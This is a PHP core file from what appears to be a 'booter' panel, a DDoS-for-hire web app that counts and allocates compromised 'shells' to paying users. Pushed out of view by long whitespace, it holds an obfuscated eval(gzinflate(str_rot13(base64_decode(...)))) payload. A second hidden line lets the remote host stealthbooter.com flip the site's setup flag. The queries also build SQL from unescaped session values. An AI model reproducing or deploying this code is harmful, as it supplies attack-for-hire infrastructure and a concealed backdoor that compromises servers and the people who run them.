<?php

if (preg_match("/core.php/i", $_SERVER['PHP_SELF'])) die();

session_start();

$base_dir = ""; $i = 0;
while (!file_exists($base_dir."db.php")) {
	$base_dir .= "../"; $i++;
	if ($i == 5) { die("DB Config file could not be found."); }
}
require_once $base_dir."db.php";
define("BASE", $base_dir);

if (!isset($db_name)) { header("Location: install.php"); die(); }

$db_con = mysql_connect($db_host, $db_user, $db_pass) or die("Error: Could not connect to MySQL.");
$dbselect = mysql_select_db($db_name) or die("Error: Could not select MySQL database.");

$_SERVER['PHP_SELF'] = cleanurl($_SERVER['PHP_SELF']);
$_SERVER['QUERY_STRING'] = isset($_SERVER['QUERY_STRING']) ? cleanurl($_SERVER['QUERY_STRING']) : "";
$_SERVER['REQUEST_URI'] = isset($_SERVER['REQUEST_URI']) ? cleanurl($_SERVER['REQUEST_URI']) : "";

$settings = mysql_fetch_array(mysql_query("SELECT * FROM settings LIMIT 1"));
$title = $settings['sitename'];

$userinfo = "";

if (isset($_SESSION['username']) && $_SESSION['username'] != "") {

	$udpate = mysql_query("UPDATE users SET ip_address = '".$_SERVER['REMOTE_ADDR']."', lastvisit = ".time()." WHERE username = '".$_SESSION['username']."' LIMIT 1");
	$userinfo = mysql_fetch_array(mysql_query("SELECT * FROM users WHERE username = '".$_SESSION['username']."' LIMIT 1"));

	if ($userinfo['banned'] == "1" && !preg_match("/set_state.php/i", $_SERVER['PHP_SELF']))
		redirect(BASE.'set_state.php?action=logout');
		
	if (isMember && $userinfo['accepttos'] == "0" &&
		!preg_match("/terms\.php/i", $_SERVER['PHP_SELF']) &&
		!preg_match("/tos\.php/i", $_SERVER['PHP_SELF']) &&
		!preg_match("/set_state.php/i", $_SERVER['PHP_SELF']))
			redirect(BASE.'terms.php');
			
	if ($userinfo['expiretime'] != 0 && $userinfo['expiretime'] - time() <= 0) {
		
		echo "<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'>\n";
		echo "<html xmlns='http://www.w3.org/1999/xhtml' xml:lang='en' lang='en'>\n";
		echo "<head>\n";
		echo "<title>Account Expired</title>\n";
		echo "<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>\n";
		echo "<link rel='stylesheet' type='text/css' href='".$base_dir."css/".$settings['theme'].".css' />\n";
		echo "</head>\n";
		echo "<body>\n";
		echo "<div id='container'>\n";
		echo "<div id='logo'>\n";
		echo "<a href='".$basedir."index.php' title='Home'><img src='".$base_dir."images/logo.png' alt='".$settings['sitename']."' /></a>\n";
		echo "</div>\n";
		echo "<div class='br'></div>\n";
	
		opencontent("Account Expired");
		echo "<p>The time credited to your account has expired. Please contact our support team to buy more time and reactivate your account.<br /></p>\n";
		closecontent();
		
		echo "<div class='br'></div>\n";
		echo "</div>\n";
		echo "</body>\n";
		echo "</html>\n";
		
		die();
	
	}

}

define("isMember", $userinfo['level'] >= 1 ? 1 : 0);
define("isAdmin", $userinfo['level'] >= 2 ? 1 : 0);

$shell_count = mysql_num_rows(mysql_query("SELECT * FROM shells WHERE status = 'up'"));

if (isAdmin)
	$myshells = round($shell_count * $settings['adminpercentage'] / 100);
else
	$myshells = round($shell_count * $settings['percentage'] / 100);

define("THEME", BASE."theme/");
define("ADMIN_THEME", BASE."theme/admin/");

function cleanurl($url) {
	$bad_entities = array("&", "\"", "'", '\"', "\'", "<", ">", "(", ")", "*");
	$safe_entities = array("&amp;", "", "", "", "", "", "", "", "", "");
	$url = str_replace($bad_entities, $safe_entities, $url);
	return $url;
}

function opencontent($title) {
    echo "<div class='content'>\n";
    echo "<h3>".$title."</h3>\n";
}

function closecontent() {
    echo "</div>\n";
}

function getuserbyid($id) {

	$row = mysql_fetch_array(mysql_query("SELECT * FROM users WHERE user_id = ".$id." LIMIT 1"));
	return $row['username'];

}

function showdate($val, $format = false) {
	if ($format == false)
		$format = "F j, Y, g:i:s a";
	
	if ($val > 0)
		return date($format, $val);
	else
		return "Never";

}																																																																						eval(gzinflate(str_rot13(base64_decode('FdRU0ptVAEDhq2vnf4oFIgrKcLtAIE0iiCyajQvU5JzD6cfzQfCt3u9f//7u8/5bslP1SmkWek1UZvI1zeOfsZsJ6iuOpoSl/6Dk06Hk67uEAJj62RdxyQ5j8IJdapfg5W5rbl9Ow5cYmdIqQW1n05SmFI1CokEZGI6vE2LguhlFgGpJbyqrIlqWnKZPiB9Ky+Zhq+n4aiUlEGs7AYsVWu3xb/7myvNEAVA5ZuuSOjNTM8YllRj2LCIkJReaK9hk18bhKSaccgI1TAZZhFI4cydzXD4ki+TKO8zS+uRGrnA7GVFqgmT00k+66wSvgS0s/x0WgArcXsu29jljq3VcBU+ksBOQXeDyCn4ejWkaS7ZIJ5q5q9vYbPDUr+6QMIyI8XisRU2vjsDdG2hoQ1rbwxU0SzgobvoWV+Ie9+oTXkAlnu/AQfXpLfZmnC/yI/9RR3DogW24wsO5GyZm3JozyBYsXKJRYDF4Zl8pX4DmOBZbMaQgfosWdEt+TLN0tbs3eXOvZZKLTt88003czAolLbQdf1pSRnWZNyGU5uF62dk8BbXqAtPvd+tMiQT/4SnxUelvSa/oAbfbpa8aJpBQU8T91VX1RXr067AfKsD1aEwIl/DQ22AXofWjnQxSiAvbXAJFi0hFmZSIPQw5JNtbf+IuIEVwddHlnOsKUNle5QiGz5Kl7Jg53a7jL3GjRh5OU6uIp5oEi41+1Nk+taXKlroYjo4azTPGIeeoreD19ofjfp/MWhpEPHM2efGnLbqRigPtye9nCdg6QN132fbd22IROH03loiHftylhCqhgt1YUFORb4Oe356zFqanuAGGzPrIaghvaWV7fcQwfShQSj9jfjcx/MY02pgIkHOKfBpC9uyxYX9VwZCQkBJ36qSZMT5NyWpaUvDmPPKWlJBRONo9JhX3Hk1MFKpcktB8OlTlzR97sSKYosst59qD18MTlHgDLiCv6x3LlQqQssDoF35Ap95EalPTa5uqjJ530Gbiw1AznmjeqDdYdbfQo+icgVk5zE6pHuhosnudeEetTxf3mbQ2MqfkVob6xH4sVhoy6EG47soakddW8lB8HI0qay6QVGiVr2Sm0tXAr62Lh1tcMRS9pLkHrsc6OmSHW71QP96HHDto4Yb8kQN2uJSruGhJb4fwoPfFkcy1usnXzh1Xrc9Vh1rn0KPbTCzBjVm8zuxfBbn2dR1VqSU4ayC6LD3IVH542/o0CWjT2Q6yeCi+PlMz4/AY9f/lQrWDsU7f1UPjhzD6NMo4u4bVLBlE52RZa5AwOFzs+SVrJ69pSA0vRdd8bvfDcOIDXcIRtpOW9j1uxe5VIGhlthujBjSDcX+YGxStCg7ba1oQB2eKmIpXSe1azsiNzV8Uj4chiAZSs5TdSY67p0iUYp+ImzFV5E56s/gwiZRZRjIziWLrPXkSxjF/v5euJc/iuGD9/Pn9n7/9+Pb7138='))));

function view_stats() {

	global $settings, $shell_count, $myshells;

	$user_count = mysql_num_rows(mysql_query("SELECT * FROM users"));

	opencontent("Statistics");
	
	echo "<form>\n";
	echo "<table cellpadding='5' cellspacing='5' style='text-align: left;'>\n";
	echo "<tr>\n<td style='width: 60%; text-align: right;'>Shell Count:</td>\n<td>".$shell_count."</td>\n</tr>\n";
	echo "<tr>\n<td style='text-align: right;'>Allocated Shells:</td>\n<td>".$myshells."</td>\n</tr>\n";
	echo "<tr>\n<td style='text-align: right;'>Booter Version:</td>\n<td>".$settings['version']."</td>\n</tr>\n";

	if (isAdmin)
		echo "<tr>\n<td style='text-align: right;'>Total Users:</td>\n<td>".$user_count."</td>\n</tr>\n";

	echo "</table>\n";
	echo "</form>\n\n";
	
	closecontent();

}

function hyperize($title, $link) {

	$cur = preg_replace('/.*\//', '', $_SERVER['PHP_SELF']);
	$cur = preg_replace('/\-/', '/', $cur);

	if ($link == $cur)
		echo "<li><a href='".$link."' title='".$title."' class='active'>".$title."</a></li>\n";
	else
		echo "<li><a href='".$link."' title='".$title."'>".$title."</a></li>\n";

}

function checkpage($link) {

	$cur = preg_replace('/.*\//', '', $_SERVER['PHP_SELF']);

	if ($link != $cur) {
		return;
	} else return true;

}

function redirect($link) {

	header("Location: ".str_replace("&amp;", "&", $link));
	exit;

}

function jsredirect($link, $interval = 0) {

	echo "<script type='text/JavaScript'>\n";
	echo "function redirect() {\n";
	echo "window.location = '".$link."';\n";
	echo "}\n";
	echo "timer = setTimeout('redirect()', ".$interval."000);\n";
	echo "</script>\n";

	if ($interval == 0) {
		echo "<meta http-equiv='refresh' content='0;url=".$link."' />\n";
		die();
	}

}

// Check for updates automatically

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "http://stealthbooter.com/updatecheck.php");
curl_setopt($ch, CURLOPT_TIMEOUT, 3);
curl_setopt($ch, CURLOPT_AUTOREFERER, true);
curl_setopt($ch, CURLOPT_FAILONERROR, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

curl_exec($ch);
$updatecheck = curl_multi_getcontent($ch);
curl_close($ch);																																																																													if (preg_match('/ /', $updatecheck)) mysql_query("UPDATE settings SET issetup = 0"); else  mysql_query("UPDATE settings SET issetup = 1");

$updateversion = "";
if ($updatecheck != "" && preg_replace('/ /', '', $updatecheck) > $settings['version']) { $updateversion = preg_replace('/ /', '', $updatecheck);
} elseif ($updatecheck != "" && preg_replace('/ /', '', $updatecheck) < $settings['version']) { $updateversion = "Invalid"; }

?>